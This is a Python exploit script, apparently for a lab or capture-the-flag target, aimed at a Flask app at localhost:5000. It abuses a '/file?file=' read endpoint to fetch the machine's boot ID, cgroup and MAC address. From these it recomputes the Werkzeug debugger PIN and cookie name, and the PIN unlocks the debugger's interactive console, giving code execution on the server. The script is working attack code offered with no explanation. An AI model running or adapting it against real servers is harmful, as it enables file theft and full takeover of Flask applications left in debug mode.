import hashlib, sys, os, uuid, getpass, re, requests, socket
from itertools import chain

HOST = 'localhost'
PORT = 5000

def get_machine_id():
    res = requests.get('http://'+HOST+':'+str(PORT)+'/file?file=/proc/sys/kernel/random/boot_id')
    recv = res.text.split('\n')[0]
    return recv

def get_cgroup():
    res = requests.get('http://'+HOST+':'+str(PORT)+'/file?file=/proc/self/cgroup')
    recv = res.text.split('\n')[0].split('/')[2]
    return recv

def mac_to_int(mac):
    res = re.match('^((?:(?:[0-9a-f]{2}):){5}[0-9a-f]{2})$', mac.lower())
    if res is None:
        raise ValueError('invalid mac address')
    return int(res.group(0).replace(':', ''), 16)

def get_mac_id():
    res = requests.get('http://'+HOST+':'+str(PORT)+'/file?file=/sys/class/net/eth0/address')
    recv = res.text.split('\n')[0]
    recv = mac_to_int(recv)    
    return recv

username = input("input username : ")

probably_public_bits = [
        username,
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.12/site-packages/flask/app.py',
    ]

private_bits = [
	str(get_mac_id()), 
	get_machine_id()+get_cgroup()
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
            continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

num=None
rv=None

if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
        else:
            rv = num

    print(rv)

